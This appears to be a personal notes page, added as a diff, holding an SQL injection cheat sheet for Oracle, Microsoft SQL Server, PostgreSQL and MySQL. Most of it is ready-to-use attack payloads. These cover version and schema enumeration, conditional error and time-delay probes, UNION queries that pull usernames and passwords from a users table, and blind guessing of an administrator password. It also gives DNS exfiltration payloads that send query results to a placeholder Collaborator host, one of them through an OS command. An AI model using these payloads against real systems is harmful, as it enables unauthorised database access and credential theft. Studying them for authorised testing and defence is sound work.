@@ -1,0 +1,169 @@
+<h1 id="sql_injection">SQL_Injection<a aria-hidden="true" class="anchor-heading icon-link" href="#sql_injection"></a></h1>
+<h2 id="sql-injection-cheat-sheet">SQL injection cheat sheet<a aria-hidden="true" class="anchor-heading icon-link" href="#sql-injection-cheat-sheet"></a></h2>
+<p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
+<h3 id="string-concatenation">String concatenation<a aria-hidden="true" class="anchor-heading icon-link" href="#string-concatenation"></a></h3>
+<p>You can concatenate together multiple strings to make a single string.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	<span class="token string">'foo'</span><span class="token operator">||</span><span class="token string">'bar'</span>
+Microsoft	<span class="token string">'foo'</span><span class="token operator">+</span><span class="token string">'bar'</span>
+PostgreSQL	<span class="token string">'foo'</span><span class="token operator">||</span><span class="token string">'bar'</span>
+MySQL	<span class="token string">'foo'</span> <span class="token string">'bar'</span> <span class="token punctuation">[</span>Note the space <span class="token operator">between</span> the two strings<span class="token punctuation">]</span>
+CONCAT<span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="substring">Substring<a aria-hidden="true" class="anchor-heading icon-link" href="#substring"></a></h3>
+<p>You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	SUBSTR<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+Microsoft	SUBSTRING<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+PostgreSQL	SUBSTRING<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+MySQL	SUBSTRING<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="comments">Comments<a aria-hidden="true" class="anchor-heading icon-link" href="#comments"></a></h3>
+<p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	<span class="token comment">--comment</span>
+Microsoft	<span class="token comment">--comment</span>
+<span class="token comment">/*comment*/</span>
+PostgreSQL	<span class="token comment">--comment</span>
+<span class="token comment">/*comment*/</span>
+MySQL	<span class="token comment">#comment</span>
+<span class="token comment">-- comment [Note the space after the double dash]</span>
+<span class="token comment">/*comment*/</span>
+</code></pre>
+<h3 id="database-version">Database version<a aria-hidden="true" class="anchor-heading icon-link" href="#database-version"></a></h3>
+<p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version
+<span class="token keyword">SELECT</span> version <span class="token keyword">FROM</span> v$instance
+Microsoft	<span class="token keyword">SELECT</span> @<span class="token variable">@version</span>
+PostgreSQL	<span class="token keyword">SELECT</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>
+MySQL	<span class="token keyword">SELECT</span> @<span class="token variable">@version</span>
+</code></pre>
+<h3 id="database-contents">Database contents<a aria-hidden="true" class="anchor-heading icon-link" href="#database-contents"></a></h3>
+<p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> all_tables
+<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> all_tab_columns <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
+Microsoft	<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span>
+<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
+PostgreSQL	<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span>
+<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
+MySQL	<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span>
+<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
+</code></pre>
+<h3 id="conditional-errors">Conditional errors<a aria-hidden="true" class="anchor-heading icon-link" href="#conditional-errors"></a></h3>
+<p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> TO_CHAR<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token boolean">NULL</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> dual
+Microsoft	<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span> <span class="token keyword">ELSE</span> <span class="token boolean">NULL</span> <span class="token keyword">END</span>
+PostgreSQL	<span class="token number">1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token boolean">NULL</span> <span class="token keyword">END</span><span class="token punctuation">)</span>
+MySQL	<span class="token keyword">SELECT</span> <span class="token keyword">IF</span><span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="batched-or-stacked-queries">Batched (or stacked) queries<a aria-hidden="true" class="anchor-heading icon-link" href="#batched-or-stacked-queries"></a></h3>
+<p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	Does <span class="token operator">not</span> support batched queries<span class="token punctuation">.</span>
+Microsoft	QUERY<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>HERE<span class="token punctuation">;</span> QUERY<span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span>HERE
+PostgreSQL	QUERY<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>HERE<span class="token punctuation">;</span> QUERY<span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span>HERE
+MySQL	QUERY<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>HERE<span class="token punctuation">;</span> QUERY<span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span>HERE
+</code></pre>
+<blockquote>
+<p>Note
+With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.</p>
+</blockquote>
+<h3 id="time-delays">Time delays<a aria-hidden="true" class="anchor-heading icon-link" href="#time-delays"></a></h3>
+<p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	dbms_pipe<span class="token punctuation">.</span>receive_message<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>
+Microsoft	<span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:10'</span>
+PostgreSQL	<span class="token keyword">SELECT</span> pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
+MySQL	<span class="token keyword">SELECT</span> SLEEP<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="conditional-time-delays">Conditional time delays<a aria-hidden="true" class="anchor-heading icon-link" href="#conditional-time-delays"></a></h3>
+<p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token string">'a'</span><span class="token operator">||</span>dbms_pipe<span class="token punctuation">.</span>receive_message<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token boolean">NULL</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> dual
+Microsoft	<span class="token keyword">IF</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:10'</span>
+PostgreSQL	<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> pg_sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">END</span>
+MySQL	<span class="token keyword">SELECT</span> <span class="token keyword">IF</span><span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">,</span>SLEEP<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="dns-lookup">DNS lookup<a aria-hidden="true" class="anchor-heading icon-link" href="#dns-lookup"></a></h3>
+<p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
+<p>Oracle	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> EXTRACTVALUE<span class="token punctuation">(</span>xmltype<span class="token punctuation">(</span><span class="token string">'&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/l'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dual
+</code></pre>
+<p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p>
+<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> UTL_INADDR<span class="token punctuation">.</span>get_host_address<span class="token punctuation">(</span><span class="token string">'BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">)</span>
+Microsoft	<span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">'//BURP-COLLABORATOR-SUBDOMAIN/a'</span>
+PostgreSQL	copy <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">to</span> program <span class="token string">'nslookup BURP-COLLABORATOR-SUBDOMAIN'</span>
+MySQL	The <span class="token keyword">following</span> techniques <span class="token keyword">work</span> <span class="token keyword">on</span> Windows only:
+LOAD_FILE<span class="token punctuation">(</span><span class="token string">'\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'</span><span class="token punctuation">)</span>
+<span class="token keyword">SELECT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</span>
+</code></pre>
+<h3 id="dns-lookup-with-data-exfiltration">DNS lookup with data exfiltration<a aria-hidden="true" class="anchor-heading icon-link" href="#dns-lookup-with-data-exfiltration"></a></h3>
+<p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
+<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> EXTRACTVALUE<span class="token punctuation">(</span>xmltype<span class="token punctuation">(</span><span class="token string">'&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> YOUR<span class="token operator">-</span>QUERY<span class="token operator">-</span>HERE<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/l'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dual
+Microsoft	<span class="token keyword">declare</span> <span class="token variable">@p</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@p</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> YOUR<span class="token operator">-</span>QUERY<span class="token operator">-</span>HERE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'master..xp_dirtree "//'</span><span class="token operator">+</span><span class="token variable">@p</span><span class="token operator">+</span><span class="token string">'.BURP-COLLABORATOR-SUBDOMAIN/a"'</span><span class="token punctuation">)</span>
+PostgreSQL	<span class="token keyword">create</span> <span class="token operator">OR</span> <span class="token keyword">replace</span> <span class="token keyword">function</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> void <span class="token keyword">as</span> $$
+<span class="token keyword">declare</span> c <span class="token keyword">text</span><span class="token punctuation">;</span>
+<span class="token keyword">declare</span> p <span class="token keyword">text</span><span class="token punctuation">;</span>
+<span class="token keyword">begin</span>
+<span class="token keyword">SELECT</span> <span class="token keyword">into</span> p <span class="token punctuation">(</span><span class="token keyword">SELECT</span> YOUR<span class="token operator">-</span>QUERY<span class="token operator">-</span>HERE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+c :<span class="token operator">=</span> <span class="token string">'copy (SELECT '''') to program ''nslookup '</span><span class="token operator">||</span>p<span class="token operator">||</span><span class="token string">'.BURP-COLLABORATOR-SUBDOMAIN'''</span><span class="token punctuation">;</span>
+<span class="token keyword">execute</span> c<span class="token punctuation">;</span>
+<span class="token keyword">END</span><span class="token punctuation">;</span>
+$$ <span class="token keyword">language</span> plpgsql security <span class="token keyword">definer</span><span class="token punctuation">;</span>
+<span class="token keyword">SELECT</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+MySQL	The <span class="token keyword">following</span> technique works <span class="token keyword">on</span> Windows only:
+<span class="token keyword">SELECT</span> YOUR<span class="token operator">-</span>QUERY<span class="token operator">-</span>HERE <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</span>
+</code></pre>
+<h3 id="union-attacks">UNION attacks<a aria-hidden="true" class="anchor-heading icon-link" href="#union-attacks"></a></h3>
+<p>For a UNION query to work, two key requirements must be met:</p>
+<ul>
+<li>
+<p>The individual queries must return the same number of columns.<br></p>
+</li>
+<li>
+<p>The data types in each column must be compatible between the individual queries.</p>
+<p>  <strong>Number of columns:</strong></p>
+<pre class="language-sql"><code class="language-sql"><span class="token string">' ORDER BY 1--
+'</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token number">2</span><span class="token comment">--</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> until error
+
+<span class="token operator">OR</span>
+
+<span class="token string">' UNION SELECT NULL--
+'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token comment">--</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> until success
+</code></pre>
+<p>  <strong>Probing for string data in columns:</strong></p>
+<pre class="language-sql"><code class="language-sql"><span class="token string">' UNION SELECT '</span>a<span class="token string">',NULL,NULL,NULL--
+'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token comment">--</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> until successfully injected string <span class="token keyword">value</span>
+</code></pre>
+<p>  <strong>Retrieving data</strong></p>
+<pre class="language-sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users<span class="token comment">--</span>
+</code></pre>
+<p>  <strong>Retrieving multiple values within a single column</strong>
+<br></p>
+<pre class="language-sql"><code class="language-sql"><span class="token string">' UNION SELECT username || '</span><span class="token operator">~</span>' <span class="token operator">||</span> password <span class="token keyword">FROM</span> users<span class="token comment">--</span>
+</code></pre>
+</li>
+</ul>
+<h3 id="blind-injection">Blind Injection<a aria-hidden="true" class="anchor-heading icon-link" href="#blind-injection"></a></h3>
+<p><strong>Divide and conquer password guessing:</strong></p>
+<pre class="language-sql"><code class="language-sql"><span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) > '</span>m
+
+<span class="token keyword">IF</span> <span class="token boolean">TRUE</span>:
+
+xyz<span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) > '</span>t
+
+<span class="token keyword">IF</span> <span class="token boolean">FALSE</span>:
+Try <span class="token keyword">for</span> example:
+xyz<span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) = '</span>s
+
+<span class="token keyword">IF</span> <span class="token boolean">TRUE</span><span class="token punctuation">,</span> <span class="token keyword">first</span> letter <span class="token keyword">of</span> the password has been found<span class="token punctuation">.</span>
+</code></pre>
+<h3 id="sql-injection-in-different-contexts">SQL injection in different contexts<a aria-hidden="true" class="anchor-heading icon-link" href="#sql-injection-in-different-contexts"></a></h3>
+<p>***JSON or XML based SQL injection often require code obfuscation.
+<br>
+Most common encoder:
+urlencode, dec, html entity</p>
+<p><a href="https://hackvertor.co.uk/public">Hackvertor</a> is a good tool to start with.<br>
+Also there is a plugin for Burp with the same name working with repeater.</p>
+<hr>
+<strong>Backlinks</strong>
+<ul>
+<li><a href="/Notes/notes/t7zelcb6b17opo2gjy4y9cq">Cheat Sheets:</a></li>
+</ul>
